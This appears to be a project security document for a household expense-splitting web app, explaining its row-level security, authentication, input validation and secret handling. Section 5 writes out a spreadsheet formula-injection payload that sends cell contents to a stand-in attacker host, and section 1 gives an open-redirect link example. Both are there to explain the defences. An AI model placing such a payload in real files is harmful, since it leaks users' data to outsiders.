# Basic Security

What protects SplitMate's data today, why each control exists, and what is
explicitly out of scope for the product's current baseline security bar.

The organizing principle throughout is stated once in `docs/02-architecture.md`
and worth repeating here, because every other decision in this document
follows from it: **Row-Level Security is the authorization boundary, not the
application.** A Server Action or a page component that "checks" access is
providing a better error message and a faster failure than the database
would give on its own — it is never the thing actually standing between a
user and someone else's data. If every line of TypeScript in this app were
deleted and a client queried Postgres directly with a valid session, the
data it could see would be exactly the same data it can see through the app.
That property is what the rest of this document tries to justify.

---

## 1. Authentication

Handled entirely by Supabase Auth — no passwords are stored, hashed, or
compared by this codebase.

- **Two methods, both passwordless-first:** magic link (email OTP) and Google
  OAuth. Magic link was chosen as the primary path because it removes an
  entire class of vulnerability (password reuse, credential stuffing,
  weak/leaked passwords) by never having a password to attack.
- **`getUser()`, never `getSession()`, on the server — everywhere.** This is
  the single most load-bearing line in `lib/auth.ts`, called out in its own
  comment block: `getSession()` decodes whatever is in the cookie and returns
  it _without verifying the signature_. On the server, a cookie is
  attacker-controlled input; trusting an unverified one means a forged cookie
  is indistinguishable from a real session. `getUser()` validates the token
  against the Auth server on every call, at the cost of a network round trip
  — which is why it is wrapped in React's `cache()` so one request pays that
  cost once, not once per component that asks.
- **Session tokens are short-lived (1 hour) and refreshed transparently.**
  `lib/supabase/proxy.ts` (Next.js 16's renamed `middleware.ts`, now on the
  Node runtime) refreshes the access token on every matched request before
  any page renders, because a Server Component's response has already begun
  streaming by the time it could try to set a cookie itself.
- **Open-redirect protection on the post-login destination.**
  `lib/validation/auth.ts`'s `magicLinkSchema` accepts a `next` parameter for
  "where to send the user after they sign in," and validates it is a
  same-origin path: it must start with `/` and must not start with `//`
  (which browsers parse as a protocol-relative absolute URL). Without this, a
  crafted `?next=https://evil.example` link would use our own trusted login
  flow to deliver a real, authenticated session redirect to an attacker's
  page.
- **Google OAuth's own security is Google's**, not this app's — the
  application only ever receives Supabase's already-verified identity, never
  a raw OAuth token to validate itself.

---

## 2. Authorization

Two layers, deliberately not one:

### 2.1 Row-Level Security (the real boundary)

Every table has RLS enabled, and every policy resolves down to one predicate:
_is `auth.uid()` a member of the household this row belongs to?_ — evaluated
by `is_household_member()`, a `SECURITY DEFINER` helper with a pinned
`search_path`.

That last detail matters and is worth spelling out, because it is a specific,
well-known Postgres footgun this project deliberately avoids: a
`SECURITY DEFINER` function runs with the privileges of whoever _defined_ it,
which is what lets it read `household_members` to answer "is this person a
member?" without recursing back into `household_members`'s own RLS policy (a
policy that needs to query the table it protects would otherwise call
itself). But a `SECURITY DEFINER` function with an unpinned `search_path` is
exploitable: a caller could create a same-named function or table earlier in
their session's search path and have the privileged function silently call
their version instead of the real one. Pinning `search_path = public, pg_temp`
on every such function closes that door. This is one of the seven "load
bearing technical positions" enumerated in `docs/README.md` for exactly this
reason — it is a subtle enough control that it is worth being able to explain
under questioning.

Role-based permissions (`owner` > `admin` > `member`) are enforced the same
way, via `has_household_role()` policies — an admin can manage members and
invitations, only an owner can transfer ownership or delete the household,
and a plain member can read everything but not manage anyone.

### 2.2 Application-level checks (the UX layer)

`requireUser()`, `requireMembership()`, and `requireRole()` in `lib/auth.ts`
exist so a page can refuse to render a form the user cannot submit, or a
Server Action can fail fast with a clear message, rather than making the
database reject a fully-composed request. **These checks could all be deleted
and no unauthorized data would become reachable** — RLS would still refuse
the underlying query. What would change is the failure mode: from a
clear "you don't have permission" to a confusing database error surfacing in
a form.

One specific, deliberate choice here: **non-members get a 404, not a 403.**
`requireMembership()` calls `notFound()`, not an "access denied" page.
"You're not allowed to see this household" _confirms the household exists_ —
itself information the requester was not entitled to, and with a UUID in the
URL a distinguishable response would let someone enumerate valid household
IDs by watching which ones return 403 instead of 404. A household you cannot
see must be indistinguishable from one that does not exist.

---

## 3. Actions restricted to authenticated users only

Every Server Action and every data-fetching function in `lib/actions/*.ts`
and `lib/data/*.ts` calls `getUser()` (directly, or via `requireUser`) as
its first step, before touching the database. There is no "public" write
path anywhere in the application layer. Two categories deserve a specific
mention:

- **Route handlers**, which do not get the automatic origin-check Server
  Actions get from the framework (see §5), verify identity by hand as their
  first line: `app/api/households/[householdId]/export/route.ts` returns
  `401` immediately if `getUser()` is null, then re-checks explicit household
  membership before running any query — even though RLS would independently
  return zero rows to a non-member, this avoids handing back a
  _distinguishable_ empty-but-valid CSV, which would itself confirm the
  household id is real.
- **The cron endpoint** (`app/api/cron/recurring/route.ts`) is the one route
  with no user at all — it runs on a schedule, not on behalf of anyone — so
  it cannot be gated by `getUser()`. See §6 for how it is protected instead.

---

## 4. Data isolation

Concretely, what stops one household from ever seeing another's data:

- **Every household-scoped table's RLS policy filters on `household_id`
  through `is_household_member()`.** A query for household B's expenses,
  issued with household A's member's session, returns zero rows — not a
  permission error, not a filtered result computed by application code, but
  literally no rows, because Postgres never had a match to return.
- **Storage inherits the same model, from the object's path rather than a
  separate ACL.** Receipts are stored at
  `{household_id}/{expense_id}/{uuid}.webp`, and every Storage policy
  (`supabase/migrations/20260801120400_storage.sql`) parses the first path
  segment and re-checks `is_household_member()` against it. A member of
  household A cannot construct a path into household B's folder and get a
  signed URL for it — the policy checks the household the _path_ claims, not
  a household the client asserts. The bucket itself is private
  (`public = false`); there is no unauthenticated URL that ever works, only
  short-lived signed URLs issued after that policy check passes.
- **Invitation tokens are hashed at rest.** `invitations.token_hash` stores
  only the SHA-256 hash of the invite token — the raw token exists solely in
  the emailed URL. If the table leaked in full, the hashes alone would not
  let anyone accept an invitation, the same way a leaked password hash table
  does not hand out working passwords.
- **`preview_invitation` redacts the invited email address** unless the
  caller is the intended recipient or a household admin — a hardening fix
  applied after the integration test suite (`tests/integration/invitations.test.ts`)
  demonstrated the RPC originally leaked it to any signed-in user who guessed
  or received an invitation link, which would have let someone harvest a
  roommate's email address off a URL they were never meant to open
  successfully.
- **Cross-household enumeration is closed off**, not just cross-household
  reads: the 404-not-403 pattern (§2.2) means probing sequential or guessed
  household/expense IDs cannot even distinguish "exists but I'm not a member"
  from "does not exist."

---

## 5. Input validation

- **Every Server Action parses its input through a Zod schema
  (`lib/validation/*.ts`) before touching the database**, and those schemas
  are the same ones the client-side forms use for immediate feedback — one
  definition, so the rule a user sees while typing and the rule the server
  enforces cannot drift apart. That sharing is explicitly a UX convenience,
  not a security boundary: the module's own doc comment states client-side
  validation "can be bypassed by anyone with a terminal," which is why the
  server-side parse runs unconditionally regardless of what the client
  claims to have already checked.
- **The database is the last line, not a formality.** Beyond RLS, Postgres
  itself enforces invariants no amount of application-layer validation can
  fully guarantee under concurrency: a deferred trigger rejects an expense
  whose splits do not sum to its total, check constraints reject negative
  amounts, and foreign keys reject a reference to a row that was deleted
  between the client's read and its write.
- **CSRF is handled by the framework, structurally.** Next.js Server Actions
  are POST-only and the framework verifies the request's `Origin`/`Host`
  header matches the deployment before invoking the action — there is no
  custom CSRF token to manage, and none was added, because the built-in
  check already closes the classic cross-site form submission attack for
  every mutation in this app.
- **CSV export formula injection (CWE-1236) is explicitly neutralised.**
  `lib/domain/csv.ts` prefixes any exported field starting with `=`, `+`,
  `-`, `@`, a tab, or a carriage return with a tab character, which
  suppresses spreadsheet formula evaluation while leaving the visible text
  unchanged. Without this, an expense description like
  `=HYPERLINK("http://evil.example/?d="&A1,"Rent")` would execute as a live
  formula the moment anyone opened the exported file in Excel or Sheets —
  reading other cells and exfiltrating them through a single click. This is
  covered by dedicated unit tests (`tests/unit/csv.test.ts`), not just a
  comment asserting it works.
- **XSS is closed structurally, not by an escaping convention someone has to
  remember.** React escapes all rendered text by default; the codebase
  contains no use of `dangerouslySetInnerHTML` anywhere expense
  descriptions, notes, or display names are rendered.
- **The one place a database error's raw text could reach a user, it is
  deliberately intercepted.** `lib/errors.ts` translates every
  `PostgrestError` into a stable, pre-approved user-facing message rather
  than displaying `error.message` directly — Postgres error text can name
  real table and column names (`new row violates row-level security policy
for table "expenses"`), which is meaningless to a user and a schema leak to
  an attacker probing the app. SQLSTATE `42501` (insufficient privilege —
  what an RLS rejection looks like) is deliberately translated to the same
  "not found" message as a genuinely missing row, for the same
  enumeration-resistance reason as §2.2's 404-not-403 pattern.

---

## 6. Protecting API endpoints

Every route under `app/api/` is one of two things, and each is protected
differently because they answer to different callers:

- **User-facing routes** (`export/route.ts`) authenticate the human behind
  the request via `getUser()`, exactly like a Server Action.
- **The cron route** (`app/api/cron/recurring/route.ts`) has no user to
  authenticate — it is invoked by Vercel's scheduler — so it is protected by
  a shared secret instead: a `Bearer` token compared against `CRON_SECRET`.
  That comparison is **constant-time**
  (`lib/security.ts`'s `isAuthorizedBearerToken`, backed by Node's
  `timingSafeEqual`), specifically because JavaScript's `===` on strings
  returns as soon as two characters differ — so the _time_ a rejection takes
  leaks how many leading characters of the guess were already correct,
  turning an otherwise-unguessable secret into one recoverable a byte at a
  time over enough requests. This is exactly the kind of control that looks
  like paranoia until it is the one line standing between "nobody can trigger
  this job" and "someone can, slowly, by timing responses" — which is why it
  has its own unit test (`tests/unit/security.test.ts`) asserting the timing
  property rather than just the pass/fail outcome.
- **The export route additionally bounds its own output** (`MAX_ROWS = 5000`)
  — an authenticated, authorized endpoint can still be a resource-exhaustion
  vector against your own database if a "download everything" request has no
  ceiling.

---

## 7. Secret management

- **Every environment variable is validated through a Zod schema at module
  load** (`lib/env.ts`), so a missing or malformed secret fails immediately
  and by name at startup, not with an opaque error deep inside a Supabase
  call minutes into a session.
- **Public vs. secret is a hard, enforced split, not just two different
  files.** `clientEnv` holds only `NEXT_PUBLIC_*` values, which Next.js
  inlines into the browser bundle — safe by definition, because they are
  meant to be public (the Supabase URL and anon key, both designed to be
  exposed; the anon key carries no privilege beyond what RLS already grants
  an authenticated user). `serverEnv()` is a **function**, not a constant,
  specifically so its schema is never evaluated during a client render, and
  it **throws if called from the browser** — turning an accidental import of
  a secret-holding module into a loud build/runtime failure instead of a
  silent leak into client JavaScript.
- **The service-role key is used exactly where it must be, and nowhere
  else.** It appears in the cron route (which has no user session to act
  as) and in test/seed scripts (`scripts/dev-user.mjs`,
  `tests/integration/helpers.ts`) that need to create and delete throwaway
  accounts outside the RLS model — never in a user-facing request path. The
  export route's own comment explains the road not taken: reading with the
  service-role key would have been the "obvious shortcut" for a read-only
  endpoint, but would have made that one endpoint the single place where
  household isolation depended on a line of TypeScript being correct, rather
  than on RLS.
- **Secrets are never logged.** `lib/env.ts`'s validation-error formatter
  prints variable _names_ and Zod's reason, explicitly never the value being
  validated — an error report that echoes a bad secret back into a log would
  be its own vulnerability.
- **Real secrets exist in exactly two places**: `.env.local` (gitignored,
  never committed) for local development, and Vercel's project environment
  variables for the deployed app. CI's build job uses hardcoded placeholder
  values (`docs/README.md`) because building the app proves it compiles and
  makes no network call to Supabase — it never needs, and never receives, a
  real secret. The new E2E CI job (`docs/README.md`'s "E2E-against-preview"
  section) is the one workflow that does need real credentials, supplied as
  GitHub Actions repository secrets rather than committed anywhere.

---

## 8. Additional controls worth naming explicitly

- **Security response headers** (`next.config.ts`) are applied to every
  route: `X-Content-Type-Options: nosniff` (stops a receipt image being
  sniffed and executed as HTML), `X-Frame-Options: DENY` (blocks clickjacking
  — an invisible overlay tricking someone into clicking "settle up" on a
  framed page), `Strict-Transport-Security` with a two-year max-age and
  `includeSubDomains`, a restrictive `Permissions-Policy` denying camera,
  microphone and geolocation outright, and `Referrer-Policy:
strict-origin-when-cross-origin` so household and expense IDs embedded in
  URLs are never leaked to a third-party `Referer` header.
- **The Next.js Image Optimizer is locked to Supabase's own storage
  domain** (`remotePatterns` in `next.config.ts`), not left open to any
  hostname — an unrestricted optimizer is a well-known way to turn a Next.js
  app into an open proxy for fetching arbitrary third-party URLs on the
  server's IP.
- **Auth rate limiting is Supabase's, not reimplemented.** Magic-link
  requests and sign-ups are throttled by Supabase Auth's built-in limiter —
  encountered directly during this project's own integration test runs (see
  `docs/04-test-plan.md`'s note on `withRateLimitRetry`), which is
  incidental proof the limiter is real and active, not just documented.

---

## 9. Residual risks and future improvements

Named honestly rather than omitted:

1. **No Content-Security-Policy header yet.** `next.config.ts`'s own comment
   flags this explicitly: a CSP needs per-request nonces to coexist with
   Next.js's inline bootstrap scripts without falling back to
   `'unsafe-inline'` (which would defeat much of its point), so it belongs in
   the proxy layer where per-request values are available, and has not been
   added yet. Until it is, the app has no defense-in-depth layer against XSS
   beyond React's default escaping (§5) — which is currently the only line
   of defense, not a backstop behind a second one.
2. **No application-level rate limiting on Server Actions.** Sign-in
   throttling is Supabase's; a logged-in user hammering, say, the expense
   creation action has no per-user request-rate ceiling of our own. At this
   project's scale the blast radius is low (RLS still confines any spam to
   the attacker's own household), but a shared resource like the cron
   route's downstream email sends could still be abused by a compromised
   account.
3. **No audit trail for security-relevant reads**, only for ledger
   _mutations_ (`activity_log`, `expense_revisions`). Who _viewed_ a
   household's data is not recorded anywhere — acceptable at today's stage,
   a real gap for a product handling more sensitive data.
4. **No 2FA / MFA option.** Magic link and OAuth both remove password risk,
   but neither offers a second factor for someone whose email account itself
   is compromised — the actual remaining single point of failure in this
   auth model.
5. **No automated dependency vulnerability scanning wired into CI.**
   `npm audit` is not currently a CI gate; a known-vulnerable transitive
   dependency could ship without the pipeline flagging it.
6. **No formal penetration test or third-party review.** Every claim in this
   document is backed by reading the code and, where practical, an
   automated test (the RLS integration suite, the CSV/timing unit tests) —
   but that is "we tried to break it ourselves," not an independent
   adversarial review.
7. **Account deletion is not yet implemented**, and is a harder problem than
   it looks because of a real constraint this project already ran into: an
   `auth.users` row cannot be deleted while rows they created still exist,
   since `created_by` columns reference `profiles` with no cascading
   `ON DELETE` action — correct for ledger integrity (an expense must always
   name who recorded it) but it means "delete my account" has to tombstone
   and scrub a profile rather than remove it outright, and that flow does
   not exist yet.

None of these are silent gaps — each is a scoped, named trade-off. This
product's current baseline security bar is authentication, authorization,
data isolation, input validation, endpoint protection and secret management,
all of which are implemented and verified above; the items in this section
are what handling real households' financial data at a larger scale would
need to add before these residual risks stop being theoretical.
